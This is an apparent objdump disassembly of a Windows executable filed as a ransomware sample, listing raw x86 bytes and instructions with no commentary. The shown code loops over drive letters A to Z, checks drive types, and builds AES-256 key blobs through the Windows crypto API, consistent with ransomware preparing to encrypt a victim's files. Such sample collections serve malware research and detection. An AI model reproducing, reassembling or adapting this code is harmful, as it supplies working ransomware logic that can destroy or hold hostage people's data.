
malware_samples/ransomware/d2f2dcb52f79307c4f9745a169986ff1f2d5427fe4ba000efb458f7590176da6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	51                   	push   %ecx
  401001:	56                   	push   %esi
  401002:	ff 15 44 81 40 00    	call   *0x408144
  401008:	8b 46 1c             	mov    0x1c(%esi),%eax
  40100b:	85 c0                	test   %eax,%eax
  40100d:	74 3f                	je     0x40104e
  40100f:	8d 0c 24             	lea    (%esp),%ecx
  401012:	51                   	push   %ecx
  401013:	50                   	push   %eax
  401014:	ff 15 38 81 40 00    	call   *0x408138
  40101a:	8b 56 18             	mov    0x18(%esi),%edx
  40101d:	52                   	push   %edx
  40101e:	ff 15 48 81 40 00    	call   *0x408148
  401024:	81 3c 24 03 01 00 00 	cmpl   $0x103,(%esp)
  40102b:	75 0c                	jne    0x401039
  40102d:	8b 46 1c             	mov    0x1c(%esi),%eax
  401030:	6a ff                	push   $0xffffffff
  401032:	50                   	push   %eax
  401033:	ff 15 30 81 40 00    	call   *0x408130
  401039:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  401040:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  401047:	c7 46 20 00 00 00 00 	movl   $0x0,0x20(%esi)
  40104e:	56                   	push   %esi
  40104f:	ff 15 3c 81 40 00    	call   *0x40813c
  401055:	56                   	push   %esi
  401056:	ff 15 34 81 40 00    	call   *0x408134
  40105c:	59                   	pop    %ecx
  40105d:	c3                   	ret
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	56                   	push   %esi
  401061:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  401067:	56                   	push   %esi
  401068:	ff 15 44 81 40 00    	call   *0x408144
  40106e:	83 7e 20 00          	cmpl   $0x0,0x20(%esi)
  401072:	75 15                	jne    0x401089
  401074:	8b 44 24 10          	mov    0x10(%esp),%eax
  401078:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40107c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401080:	89 46 20             	mov    %eax,0x20(%esi)
  401083:	89 4e 18             	mov    %ecx,0x18(%esi)
  401086:	89 56 1c             	mov    %edx,0x1c(%esi)
  401089:	56                   	push   %esi
  40108a:	ff 15 3c 81 40 00    	call   *0x40813c
  401090:	5e                   	pop    %esi
  401091:	c2 0c 00             	ret    $0xc
  401094:	cc                   	int3
  401095:	cc                   	int3
  401096:	cc                   	int3
  401097:	cc                   	int3
  401098:	cc                   	int3
  401099:	cc                   	int3
  40109a:	cc                   	int3
  40109b:	cc                   	int3
  40109c:	cc                   	int3
  40109d:	cc                   	int3
  40109e:	cc                   	int3
  40109f:	cc                   	int3
  4010a0:	51                   	push   %ecx
  4010a1:	56                   	push   %esi
  4010a2:	ff 15 44 81 40 00    	call   *0x408144
  4010a8:	8b 46 1c             	mov    0x1c(%esi),%eax
  4010ab:	85 c0                	test   %eax,%eax
  4010ad:	74 3f                	je     0x4010ee
  4010af:	8d 0c 24             	lea    (%esp),%ecx
  4010b2:	51                   	push   %ecx
  4010b3:	50                   	push   %eax
  4010b4:	ff 15 38 81 40 00    	call   *0x408138
  4010ba:	8b 56 18             	mov    0x18(%esi),%edx
  4010bd:	52                   	push   %edx
  4010be:	ff 15 48 81 40 00    	call   *0x408148
  4010c4:	81 3c 24 03 01 00 00 	cmpl   $0x103,(%esp)
  4010cb:	75 0c                	jne    0x4010d9
  4010cd:	8b 46 1c             	mov    0x1c(%esi),%eax
  4010d0:	6a ff                	push   $0xffffffff
  4010d2:	50                   	push   %eax
  4010d3:	ff 15 30 81 40 00    	call   *0x408130
  4010d9:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  4010e0:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  4010e7:	c7 46 20 00 00 00 00 	movl   $0x0,0x20(%esi)
  4010ee:	56                   	push   %esi
  4010ef:	ff 15 3c 81 40 00    	call   *0x40813c
  4010f5:	59                   	pop    %ecx
  4010f6:	c3                   	ret
  4010f7:	cc                   	int3
  4010f8:	cc                   	int3
  4010f9:	cc                   	int3
  4010fa:	cc                   	int3
  4010fb:	cc                   	int3
  4010fc:	cc                   	int3
  4010fd:	cc                   	int3
  4010fe:	cc                   	int3
  4010ff:	cc                   	int3
  401100:	55                   	push   %ebp
  401101:	8b ec                	mov    %esp,%ebp
  401103:	51                   	push   %ecx
  401104:	8b 45 08             	mov    0x8(%ebp),%eax
  401107:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40110a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40110d:	8b 55 10             	mov    0x10(%ebp),%edx
  401110:	83 ea 01             	sub    $0x1,%edx
  401113:	89 55 10             	mov    %edx,0x10(%ebp)
  401116:	85 c9                	test   %ecx,%ecx
  401118:	74 13                	je     0x40112d
  40111a:	8b 45 08             	mov    0x8(%ebp),%eax
  40111d:	8a 4d 0c             	mov    0xc(%ebp),%cl
  401120:	88 08                	mov    %cl,(%eax)
  401122:	8b 55 08             	mov    0x8(%ebp),%edx
  401125:	83 c2 01             	add    $0x1,%edx
  401128:	89 55 08             	mov    %edx,0x8(%ebp)
  40112b:	eb dd                	jmp    0x40110a
  40112d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401130:	8b e5                	mov    %ebp,%esp
  401132:	5d                   	pop    %ebp
  401133:	c3                   	ret
  401134:	cc                   	int3
  401135:	cc                   	int3
  401136:	cc                   	int3
  401137:	cc                   	int3
  401138:	cc                   	int3
  401139:	cc                   	int3
  40113a:	cc                   	int3
  40113b:	cc                   	int3
  40113c:	cc                   	int3
  40113d:	cc                   	int3
  40113e:	cc                   	int3
  40113f:	cc                   	int3
  401140:	55                   	push   %ebp
  401141:	8b ec                	mov    %esp,%ebp
  401143:	51                   	push   %ecx
  401144:	8b 45 08             	mov    0x8(%ebp),%eax
  401147:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40114a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40114d:	8b 55 10             	mov    0x10(%ebp),%edx
  401150:	83 ea 01             	sub    $0x1,%edx
  401153:	89 55 10             	mov    %edx,0x10(%ebp)
  401156:	85 c9                	test   %ecx,%ecx
  401158:	74 1e                	je     0x401178
  40115a:	8b 45 08             	mov    0x8(%ebp),%eax
  40115d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401160:	8a 11                	mov    (%ecx),%dl
  401162:	88 10                	mov    %dl,(%eax)
  401164:	8b 45 08             	mov    0x8(%ebp),%eax
  401167:	83 c0 01             	add    $0x1,%eax
  40116a:	89 45 08             	mov    %eax,0x8(%ebp)
  40116d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401170:	83 c1 01             	add    $0x1,%ecx
  401173:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  401176:	eb d2                	jmp    0x40114a
  401178:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40117b:	8b e5                	mov    %ebp,%esp
  40117d:	5d                   	pop    %ebp
  40117e:	c3                   	ret
  40117f:	cc                   	int3
  401180:	53                   	push   %ebx
  401181:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  401187:	56                   	push   %esi
  401188:	8b f0                	mov    %eax,%esi
  40118a:	8b 46 24             	mov    0x24(%esi),%eax
  40118d:	85 c0                	test   %eax,%eax
  40118f:	57                   	push   %edi
  401190:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  401196:	74 1d                	je     0x4011b5
  401198:	b9 80 00 00 00       	mov    $0x80,%ecx
  40119d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4011a0:	c6 00 00             	movb   $0x0,(%eax)
  4011a3:	83 c0 01             	add    $0x1,%eax
  4011a6:	83 e9 01             	sub    $0x1,%ecx
  4011a9:	75 f5                	jne    0x4011a0
  4011ab:	8b 46 24             	mov    0x24(%esi),%eax
  4011ae:	50                   	push   %eax
  4011af:	51                   	push   %ecx
  4011b0:	ff d3                	call   *%ebx
  4011b2:	50                   	push   %eax
  4011b3:	ff d7                	call   *%edi
  4011b5:	8b 46 2c             	mov    0x2c(%esi),%eax
  4011b8:	85 c0                	test   %eax,%eax
  4011ba:	74 1a                	je     0x4011d6
  4011bc:	b9 80 00 00 00       	mov    $0x80,%ecx
  4011c1:	c6 00 00             	movb   $0x0,(%eax)
  4011c4:	83 c0 01             	add    $0x1,%eax
  4011c7:	83 e9 01             	sub    $0x1,%ecx
  4011ca:	75 f5                	jne    0x4011c1
  4011cc:	8b 46 2c             	mov    0x2c(%esi),%eax
  4011cf:	50                   	push   %eax
  4011d0:	51                   	push   %ecx
  4011d1:	ff d3                	call   *%ebx
  4011d3:	50                   	push   %eax
  4011d4:	ff d7                	call   *%edi
  4011d6:	8b 46 20             	mov    0x20(%esi),%eax
  4011d9:	85 c0                	test   %eax,%eax
  4011db:	74 1a                	je     0x4011f7
  4011dd:	b9 2c 00 00 00       	mov    $0x2c,%ecx
  4011e2:	c6 00 00             	movb   $0x0,(%eax)
  4011e5:	83 c0 01             	add    $0x1,%eax
  4011e8:	83 e9 01             	sub    $0x1,%ecx
  4011eb:	75 f5                	jne    0x4011e2
  4011ed:	8b 46 20             	mov    0x20(%esi),%eax
  4011f0:	50                   	push   %eax
  4011f1:	51                   	push   %ecx
  4011f2:	ff d3                	call   *%ebx
  4011f4:	50                   	push   %eax
  4011f5:	ff d7                	call   *%edi
  4011f7:	8b 46 28             	mov    0x28(%esi),%eax
  4011fa:	85 c0                	test   %eax,%eax
  4011fc:	74 1a                	je     0x401218
  4011fe:	b9 2c 00 00 00       	mov    $0x2c,%ecx
  401203:	c6 00 00             	movb   $0x0,(%eax)
  401206:	83 c0 01             	add    $0x1,%eax
  401209:	83 e9 01             	sub    $0x1,%ecx
  40120c:	75 f5                	jne    0x401203
  40120e:	8b 76 28             	mov    0x28(%esi),%esi
  401211:	56                   	push   %esi
  401212:	51                   	push   %ecx
  401213:	ff d3                	call   *%ebx
  401215:	50                   	push   %eax
  401216:	ff d7                	call   *%edi
  401218:	5f                   	pop    %edi
  401219:	5e                   	pop    %esi
  40121a:	5b                   	pop    %ebx
  40121b:	c3                   	ret
  40121c:	cc                   	int3
  40121d:	cc                   	int3
  40121e:	cc                   	int3
  40121f:	cc                   	int3
  401220:	56                   	push   %esi
  401221:	8b 70 04             	mov    0x4(%eax),%esi
  401224:	85 f6                	test   %esi,%esi
  401226:	74 3a                	je     0x401262
  401228:	53                   	push   %ebx
  401229:	55                   	push   %ebp
  40122a:	8b 2d 8c 80 40 00    	mov    0x40808c,%ebp
  401230:	57                   	push   %edi
  401231:	8b de                	mov    %esi,%ebx
  401233:	8b 3b                	mov    (%ebx),%edi
  401235:	85 ff                	test   %edi,%edi
  401237:	8b 76 04             	mov    0x4(%esi),%esi
  40123a:	74 13                	je     0x40124f
  40123c:	8b c7                	mov    %edi,%eax
  40123e:	e8 3d ff ff ff       	call   0x401180
  401243:	57                   	push   %edi
  401244:	6a 00                	push   $0x0
  401246:	ff 15 90 80 40 00    	call   *0x408090
  40124c:	50                   	push   %eax
  40124d:	ff d5                	call   *%ebp
  40124f:	53                   	push   %ebx
  401250:	6a 00                	push   $0x0
  401252:	ff 15 90 80 40 00    	call   *0x408090
  401258:	50                   	push   %eax
  401259:	ff d5                	call   *%ebp
  40125b:	85 f6                	test   %esi,%esi
  40125d:	75 d2                	jne    0x401231
  40125f:	5f                   	pop    %edi
  401260:	5d                   	pop    %ebp
  401261:	5b                   	pop    %ebx
  401262:	5e                   	pop    %esi
  401263:	c3                   	ret
  401264:	cc                   	int3
  401265:	cc                   	int3
  401266:	cc                   	int3
  401267:	cc                   	int3
  401268:	cc                   	int3
  401269:	cc                   	int3
  40126a:	cc                   	int3
  40126b:	cc                   	int3
  40126c:	cc                   	int3
  40126d:	cc                   	int3
  40126e:	cc                   	int3
  40126f:	cc                   	int3
  401270:	6a 08                	push   $0x8
  401272:	6a 00                	push   $0x0
  401274:	ff 15 90 80 40 00    	call   *0x408090
  40127a:	50                   	push   %eax
  40127b:	ff 15 84 80 40 00    	call   *0x408084
  401281:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401285:	89 08                	mov    %ecx,(%eax)
  401287:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40128e:	8b 4e 04             	mov    0x4(%esi),%ecx
  401291:	85 c9                	test   %ecx,%ecx
  401293:	74 19                	je     0x4012ae
  401295:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  401299:	74 0e                	je     0x4012a9
  40129b:	eb 03                	jmp    0x4012a0
  40129d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4012a0:	8b 49 04             	mov    0x4(%ecx),%ecx
  4012a3:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  4012a7:	75 f7                	jne    0x4012a0
  4012a9:	89 41 04             	mov    %eax,0x4(%ecx)
  4012ac:	eb 03                	jmp    0x4012b1
  4012ae:	89 46 04             	mov    %eax,0x4(%esi)
  4012b1:	8b 10                	mov    (%eax),%edx
  4012b3:	66 83 3a 00          	cmpw   $0x0,(%edx)
  4012b7:	74 03                	je     0x4012bc
  4012b9:	83 06 01             	addl   $0x1,(%esi)
  4012bc:	c2 04 00             	ret    $0x4
  4012bf:	cc                   	int3
  4012c0:	83 ec 34             	sub    $0x34,%esp
  4012c3:	53                   	push   %ebx
  4012c4:	55                   	push   %ebp
  4012c5:	56                   	push   %esi
  4012c6:	57                   	push   %edi
  4012c7:	6a 01                	push   $0x1
  4012c9:	ff 15 1c 81 40 00    	call   *0x40811c
  4012cf:	ff 15 0c 81 40 00    	call   *0x40810c
  4012d5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4012d9:	e8 e2 5b 00 00       	call   0x406ec0
  4012de:	89 44 24 18          	mov    %eax,0x18(%esp)
  4012e2:	bd 41 00 00 00       	mov    $0x41,%ebp
  4012e7:	33 db                	xor    %ebx,%ebx
  4012e9:	8d 4d bf             	lea    -0x41(%ebp),%ecx
  4012ec:	b8 01 00 00 00       	mov    $0x1,%eax
  4012f1:	d3 e0                	shl    %cl,%eax
  4012f3:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4012f7:	85 c1                	test   %eax,%ecx
  4012f9:	0f 84 04 01 00 00    	je     0x401403
  4012ff:	8b 35 88 81 40 00    	mov    0x408188,%esi
  401305:	55                   	push   %ebp
  401306:	8d 54 24 24          	lea    0x24(%esp),%edx
  40130a:	68 a8 81 40 00       	push   $0x4081a8
  40130f:	52                   	push   %edx
  401310:	ff d6                	call   *%esi
  401312:	55                   	push   %ebp
  401313:	8d 44 24 40          	lea    0x40(%esp),%eax
  401317:	68 b8 81 40 00       	push   $0x4081b8
  40131c:	50                   	push   %eax
  40131d:	ff d6                	call   *%esi
  40131f:	83 c4 18             	add    $0x18,%esp
  401322:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401326:	51                   	push   %ecx
  401327:	ff 15 24 81 40 00    	call   *0x408124
  40132d:	53                   	push   %ebx
  40132e:	53                   	push   %ebx
  40132f:	53                   	push   %ebx
  401330:	53                   	push   %ebx
  401331:	8d 54 24 24          	lea    0x24(%esp),%edx
  401335:	52                   	push   %edx
  401336:	53                   	push   %ebx
  401337:	8b f0                	mov    %eax,%esi
  401339:	53                   	push   %ebx
  40133a:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  40133e:	50                   	push   %eax
  40133f:	ff 15 18 81 40 00    	call   *0x408118
  401345:	85 c0                	test   %eax,%eax
  401347:	75 19                	jne    0x401362
  401349:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40134d:	51                   	push   %ecx
  40134e:	ff 15 04 81 40 00    	call   *0x408104
  401354:	50                   	push   %eax
  401355:	e8 76 52 00 00       	call   0x4065d0
  40135a:	83 c4 08             	add    $0x8,%esp
  40135d:	e9 a1 00 00 00       	jmp    0x401403
  401362:	8d 56 fe             	lea    -0x2(%esi),%edx
  401365:	83 fa 02             	cmp    $0x2,%edx
  401368:	0f 87 95 00 00 00    	ja     0x401403
  40136e:	38 5c 24 4c          	cmp    %bl,0x4c(%esp)
  401372:	75 15                	jne    0x401389
  401374:	83 fe 04             	cmp    $0x4,%esi
  401377:	74 10                	je     0x401389
  401379:	56                   	push   %esi
  40137a:	8d 44 24 24          	lea    0x24(%esp),%eax
  40137e:	50                   	push   %eax
  40137f:	e8 4c 52 00 00       	call   0x4065d0
  401384:	83 c4 08             	add    $0x8,%esp
  401387:	eb 7a                	jmp    0x401403
  401389:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40138d:	51                   	push   %ecx
  40138e:	56                   	push   %esi
  40138f:	8d 54 24 28          	lea    0x28(%esp),%edx
  401393:	52                   	push   %edx
  401394:	e8 37 52 00 00       	call   0x4065d0
  401399:	83 c4 0c             	add    $0xc,%esp
  40139c:	6a 34                	push   $0x34
  40139e:	53                   	push   %ebx
  40139f:	ff 15 90 80 40 00    	call   *0x408090
  4013a5:	50                   	push   %eax
  4013a6:	ff 15 84 80 40 00    	call   *0x408084
  4013ac:	3b c3                	cmp    %ebx,%eax
  4013ae:	74 23                	je     0x4013d3
  4013b0:	89 58 10             	mov    %ebx,0x10(%eax)
  4013b3:	89 58 14             	mov    %ebx,0x14(%eax)
  4013b6:	89 58 18             	mov    %ebx,0x18(%eax)
  4013b9:	89 58 1c             	mov    %ebx,0x1c(%eax)
  4013bc:	89 58 20             	mov    %ebx,0x20(%eax)
  4013bf:	89 58 24             	mov    %ebx,0x24(%eax)
  4013c2:	89 58 28             	mov    %ebx,0x28(%eax)
  4013c5:	89 58 2c             	mov    %ebx,0x2c(%eax)
  4013c8:	c6 40 30 01          	movb   $0x1,0x30(%eax)
  4013cc:	66 89 18             	mov    %bx,(%eax)
  4013cf:	8b f8                	mov    %eax,%edi
  4013d1:	eb 02                	jmp    0x4013d5
  4013d3:	33 ff                	xor    %edi,%edi
  4013d5:	55                   	push   %ebp
  4013d6:	68 c4 81 40 00       	push   $0x4081c4
  4013db:	57                   	push   %edi
  4013dc:	ff 15 88 81 40 00    	call   *0x408188
  4013e2:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4013e6:	89 5f 10             	mov    %ebx,0x10(%edi)
  4013e9:	8b 44 24 20          	mov    0x20(%esp),%eax
  4013ed:	83 c4 0c             	add    $0xc,%esp
  4013f0:	89 77 1c             	mov    %esi,0x1c(%edi)
  4013f3:	8b 74 24 48          	mov    0x48(%esp),%esi
  4013f7:	57                   	push   %edi
  4013f8:	89 47 14             	mov    %eax,0x14(%edi)
  4013fb:	89 4f 18             	mov    %ecx,0x18(%edi)
  4013fe:	e8 6d fe ff ff       	call   0x401270
  401403:	83 c5 01             	add    $0x1,%ebp
  401406:	8d 55 bf             	lea    -0x41(%ebp),%edx
  401409:	83 fa 1a             	cmp    $0x1a,%edx
  40140c:	0f 8c d7 fe ff ff    	jl     0x4012e9
  401412:	38 5c 24 4c          	cmp    %bl,0x4c(%esp)
  401416:	0f 85 8e 00 00 00    	jne    0x4014aa
  40141c:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  401422:	6a 34                	push   $0x34
  401424:	53                   	push   %ebx
  401425:	ff d5                	call   *%ebp
  401427:	8b 35 84 80 40 00    	mov    0x408084,%esi
  40142d:	50                   	push   %eax
  40142e:	ff d6                	call   *%esi
  401430:	3b c3                	cmp    %ebx,%eax
  401432:	74 23                	je     0x401457
  401434:	89 58 10             	mov    %ebx,0x10(%eax)
  401437:	89 58 14             	mov    %ebx,0x14(%eax)
  40143a:	89 58 18             	mov    %ebx,0x18(%eax)
  40143d:	89 58 1c             	mov    %ebx,0x1c(%eax)
  401440:	89 58 20             	mov    %ebx,0x20(%eax)
  401443:	89 58 24             	mov    %ebx,0x24(%eax)
  401446:	89 58 28             	mov    %ebx,0x28(%eax)
  401449:	89 58 2c             	mov    %ebx,0x2c(%eax)
  40144c:	c6 40 30 01          	movb   $0x1,0x30(%eax)
  401450:	66 89 18             	mov    %bx,(%eax)
  401453:	8b f8                	mov    %eax,%edi
  401455:	eb 02                	jmp    0x401459
  401457:	33 ff                	xor    %edi,%edi
  401459:	8b 44 24 18          	mov    0x18(%esp),%eax
  40145d:	6a 08                	push   $0x8
  40145f:	53                   	push   %ebx
  401460:	66 89 1f             	mov    %bx,(%edi)
  401463:	89 5f 10             	mov    %ebx,0x10(%edi)
  401466:	89 5f 14             	mov    %ebx,0x14(%edi)
  401469:	89 47 18             	mov    %eax,0x18(%edi)
  40146c:	c7 47 1c 04 00 00 00 	movl   $0x4,0x1c(%edi)
  401473:	ff d5                	call   *%ebp
  401475:	50                   	push   %eax
  401476:	ff d6                	call   *%esi
  401478:	8b 54 24 48          	mov    0x48(%esp),%edx
  40147c:	89 38                	mov    %edi,(%eax)
  40147e:	89 58 04             	mov    %ebx,0x4(%eax)
  401481:	8b 4a 04             	mov    0x4(%edx),%ecx
  401484:	3b cb                	cmp    %ebx,%ecx
  401486:	74 15                	je     0x40149d
  401488:	39 59 04             	cmp    %ebx,0x4(%ecx)
  40148b:	74 0b                	je     0x401498
  40148d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401490:	8b 49 04             	mov    0x4(%ecx),%ecx
  401493:	39 59 04             	cmp    %ebx,0x4(%ecx)
  401496:	75 f8                	jne    0x401490
  401498:	89 41 04             	mov    %eax,0x4(%ecx)
  40149b:	eb 03                	jmp    0x4014a0
  40149d:	89 42 04             	mov    %eax,0x4(%edx)
  4014a0:	8b 08                	mov    (%eax),%ecx
  4014a2:	66 39 19             	cmp    %bx,(%ecx)
  4014a5:	74 03                	je     0x4014aa
  4014a7:	83 02 01             	addl   $0x1,(%edx)
  4014aa:	5f                   	pop    %edi
  4014ab:	5e                   	pop    %esi
  4014ac:	5d                   	pop    %ebp
  4014ad:	5b                   	pop    %ebx
  4014ae:	83 c4 34             	add    $0x34,%esp
  4014b1:	c2 08 00             	ret    $0x8
  4014b4:	cc                   	int3
  4014b5:	cc                   	int3
  4014b6:	cc                   	int3
  4014b7:	cc                   	int3
  4014b8:	cc                   	int3
  4014b9:	cc                   	int3
  4014ba:	cc                   	int3
  4014bb:	cc                   	int3
  4014bc:	cc                   	int3
  4014bd:	cc                   	int3
  4014be:	cc                   	int3
  4014bf:	cc                   	int3
  4014c0:	53                   	push   %ebx
  4014c1:	8b 58 04             	mov    0x4(%eax),%ebx
  4014c4:	85 db                	test   %ebx,%ebx
  4014c6:	0f 84 f5 00 00 00    	je     0x4015c1
  4014cc:	55                   	push   %ebp
  4014cd:	8b 2d 00 80 40 00    	mov    0x408000,%ebp
  4014d3:	56                   	push   %esi
  4014d4:	57                   	push   %edi
  4014d5:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4014da:	83 38 00             	cmpl   $0x0,(%eax)
  4014dd:	8b f8                	mov    %eax,%edi
  4014df:	75 1a                	jne    0x4014fb
  4014e1:	68 00 00 00 f0       	push   $0xf0000000
  4014e6:	6a 18                	push   $0x18
  4014e8:	6a 00                	push   $0x0
  4014ea:	6a 00                	push   $0x0
  4014ec:	50                   	push   %eax
  4014ed:	ff 15 28 80 40 00    	call   *0x408028
  4014f3:	85 c0                	test   %eax,%eax
  4014f5:	75 04                	jne    0x4014fb
  4014f7:	89 07                	mov    %eax,(%edi)
  4014f9:	eb 44                	jmp    0x40153f
  4014fb:	6a 2c                	push   $0x2c
  4014fd:	6a 00                	push   $0x0
  4014ff:	ff 15 90 80 40 00    	call   *0x408090
  401505:	50                   	push   %eax
  401506:	ff 15 84 80 40 00    	call   *0x408084
  40150c:	8b f0                	mov    %eax,%esi
  40150e:	85 f6                	test   %esi,%esi
  401510:	74 2d                	je     0x40153f
  401512:	6a 2c                	push   $0x2c
  401514:	6a 00                	push   $0x0
  401516:	56                   	push   %esi
  401517:	e8 e4 fb ff ff       	call   0x401100
  40151c:	83 c4 0c             	add    $0xc,%esp
  40151f:	8d 4e 0c             	lea    0xc(%esi),%ecx
  401522:	51                   	push   %ecx
  401523:	66 c7 06 08 02       	movw   $0x208,(%esi)
  401528:	66 c7 46 04 10 66    	movw   $0x6610,0x4(%esi)
  40152e:	c6 46 08 20          	movb   $0x20,0x8(%esi)
  401532:	8b 17                	mov    (%edi),%edx
  401534:	6a 20                	push   $0x20
  401536:	52                   	push   %edx
  401537:	ff d5                	call   *%ebp
  401539:	f7 d8                	neg    %eax
  40153b:	1b c0                	sbb    %eax,%eax
  40153d:	23 c6                	and    %esi,%eax
  40153f:	8b 0b                	mov    (%ebx),%ecx
  401541:	89 41 20             	mov    %eax,0x20(%ecx)
  401544:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401549:	83 38 00             	cmpl   $0x0,(%eax)
  40154c:	8b f8                	mov    %eax,%edi
  40154e:	75 1a                	jne    0x40156a
  401550:	68 00 00 00 f0       	push   $0xf0000000
  401555:	6a 18                	push   $0x18
  401557:	6a 00                	push   $0x0
  401559:	6a 00                	push   $0x0
  40155b:	50                   	push   %eax
  40155c:	ff 15 28 80 40 00    	call   *0x408028
  401562:	85 c0                	test   %eax,%eax
  401564:	75 04                	jne    0x40156a
  401566:	89 07                	mov    %eax,(%edi)
  401568:	eb 44                	jmp    0x4015ae
  40156a:	6a 2c                	push   $0x2c
  40156c:	6a 00                	push   $0x0
  40156e:	ff 15 90 80 40 00    	call   *0x408090
  401574:	50                   	push   %eax
  401575:	ff 15 84 80 40 00    	call   *0x408084
  40157b:	8b f0                	mov    %eax,%esi
  40157d:	85 f6                	test   %esi,%esi
  40157f:	74 2d                	je     0x4015ae
  401581:	6a 2c                	push   $0x2c
  401583:	6a 00                	push   $0x0
  401585:	56                   	push   %esi
  401586:	e8 75 fb ff ff       	call   0x401100
  40158b:	83 c4 0c             	add    $0xc,%esp
  40158e:	8d 56 0c             	lea    0xc(%esi),%edx
  401591:	52                   	push   %edx
  401592:	66 c7 06 08 02       	movw   $0x208,(%esi)
  401597:	66 c7 46 04 10 66    	movw   $0x6610,0x4(%esi)
  40159d:	c6 46 08 20          	movb   $0x20,0x8(%esi)
  4015a1:	8b 07                	mov    (%edi),%eax
  4015a3:	6a 20                	push   $0x20
  4015a5:	50                   	push   %eax
  4015a6:	ff d5                	call   *%ebp
  4015a8:	f7 d8                	neg    %eax
  4015aa:	1b c0                	sbb    %eax,%eax
  4015ac:	23 c6                	and    %esi,%eax
  4015ae:	8b 0b                	mov    (%ebx),%ecx
  4015b0:	89 41 28             	mov    %eax,0x28(%ecx)
  4015b3:	8b 5b 04             	mov    0x4(%ebx),%ebx
  4015b6:	85 db                	test   %ebx,%ebx
  4015b8:	0f 85 17 ff ff ff    	jne    0x4014d5
  4015be:	5f                   	pop    %edi
  4015bf:	5e                   	pop    %esi
  4015c0:	5d                   	pop    %ebp
  4015c1:	5b                   	pop    %ebx
  4015c2:	c3                   	ret
  4015c3:	cc                   	int3
  4015c4:	cc                   	int3
  4015c5:	cc                   	int3
  4015c6:	cc                   	int3
  4015c7:	cc                   	int3
  4015c8:	cc                   	int3
  4015c9:	cc                   	int3
  4015ca:	cc                   	int3
  4015cb:	cc                   	int3
  4015cc:	cc                   	int3
  4015cd:	cc                   	int3
  4015ce:	cc                   	int3
  4015cf:	cc                   	int3
  4015d0:	51                   	push   %ecx
  4015d1:	53                   	push   %ebx
  4015d2:	55                   	push   %ebp
  4015d3:	56                   	push   %esi
  4015d4:	57                   	push   %edi
  4015d5:	8b 78 04             	mov    0x4(%eax),%edi
  4015d8:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4015dd:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4015e1:	51                   	push   %ecx
  4015e2:	6a 37                	push   $0x37
  4015e4:	e8 67 13 00 00       	call   0x402950
  4015e9:	8b e8                	mov    %eax,%ebp
  4015eb:	85 ed                	test   %ebp,%ebp
  4015ed:	75 08                	jne    0x4015f7
  4015ef:	32 c0                	xor    %al,%al
  4015f1:	5f                   	pop    %edi
  4015f2:	5e                   	pop    %esi
  4015f3:	5d                   	pop    %ebp
  4015f4:	5b                   	pop    %ebx
  4015f5:	59                   	pop    %ecx
  4015f6:	c3                   	ret
  4015f7:	85 ff                	test   %edi,%edi
  4015f9:	0f 84 09 01 00 00    	je     0x401708
  4015ff:	68 80 00 00 00       	push   $0x80
  401604:	6a 00                	push   $0x0
  401606:	ff 15 90 80 40 00    	call   *0x408090
  40160c:	8b 1d 84 80 40 00    	mov    0x408084,%ebx
  401612:	50                   	push   %eax
  401613:	ff d3                	call   *%ebx
  401615:	68 80 00 00 00       	push   $0x80
  40161a:	6a 00                	push   $0x0
  40161c:	8b f0                	mov    %eax,%esi
  40161e:	ff 15 90 80 40 00    	call   *0x408090
  401624:	50                   	push   %eax
  401625:	ff d3                	call   *%ebx
  401627:	85 f6                	test   %esi,%esi
  401629:	8b d8                	mov    %eax,%ebx
  40162b:	74 c2                	je     0x4015ef
  40162d:	85 db                	test   %ebx,%ebx
  40162f:	74 be                	je     0x4015ef
  401631:	68 80 00 00 00       	push   $0x80
  401636:	6a 00                	push   $0x0
  401638:	56                   	push   %esi
  401639:	e8 c2 fa ff ff       	call   0x401100
  40163e:	83 c4 0c             	add    $0xc,%esp
  401641:	68 80 00 00 00       	push   $0x80
  401646:	6a 00                	push   $0x0
  401648:	53                   	push   %ebx
  401649:	e8 b2 fa ff ff       	call   0x401100
  40164e:	8b 55 00             	mov    0x0(%ebp),%edx
  401651:	89 16                	mov    %edx,(%esi)
  401653:	8b 07                	mov    (%edi),%eax
  401655:	8b 48 18             	mov    0x18(%eax),%ecx
  401658:	89 4e 04             	mov    %ecx,0x4(%esi)
  40165b:	8b 17                	mov    (%edi),%edx
  40165d:	8b 42 14             	mov    0x14(%edx),%eax
  401660:	89 46 08             	mov    %eax,0x8(%esi)
